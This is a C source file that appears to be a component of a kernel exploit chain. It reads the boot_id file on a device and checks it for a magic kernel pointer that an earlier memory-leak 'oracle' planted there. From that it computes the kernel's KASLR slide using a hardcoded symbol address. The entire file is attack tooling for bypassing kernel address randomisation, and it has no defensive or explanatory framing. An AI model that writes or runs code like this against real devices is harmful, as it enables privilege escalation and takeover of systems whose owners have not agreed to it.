/* slide_dec — device-side KASLR slide decoder (mirror of tools/slide_decode.py).
 * Reads /proc/sys/kernel/random/boot_id; if it is SLIDE-oracle output,
 * prints the decoded slide as 0x..., else prints MISS. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static uint64_t le64(const unsigned char *p) {
  uint64_t v = 0;
  for (int i = 7; i >= 0; i--) v = (v << 8) | p[i];
  return v;
}

int main(void) {
  char buf[128] = {0};
  FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
  if (!f) { printf("MISS\n"); return 1; }
  if (!fgets(buf, sizeof(buf), f)) { fclose(f); printf("MISS\n"); return 1; }
  fclose(f);
  char hex[40];
  int j = 0;
  for (int i = 0; buf[i] && j < 32; i++)
    if (buf[i] != '-') hex[j++] = buf[i];
  hex[j] = 0;
  if (j != 32) { printf("MISS\n"); return 1; }
  unsigned char raw[16];
  for (int i = 0; i < 16; i++) {
    char b[3] = {hex[i * 2], hex[i * 2 + 1], 0};
    raw[i] = (unsigned char)strtoul(b, NULL, 16);
  }
  uint64_t name = le64(raw);
  uint64_t tail = le64(raw + 8);
  if (tail != 0xFFFFFF802A8DA8E0ULL) { printf("MISS\n"); return 1; }
  uint64_t slide = name - 0xFFFFFFC00A071F66ULL;
  if (slide == 0 || (slide & 0x1FFFFF) != 0 || slide > 0x10000000000ULL) {
    printf("MISS\n");
    return 1;
  }
  printf("0x%llx\n", (unsigned long long)slide);
  return 0;
}
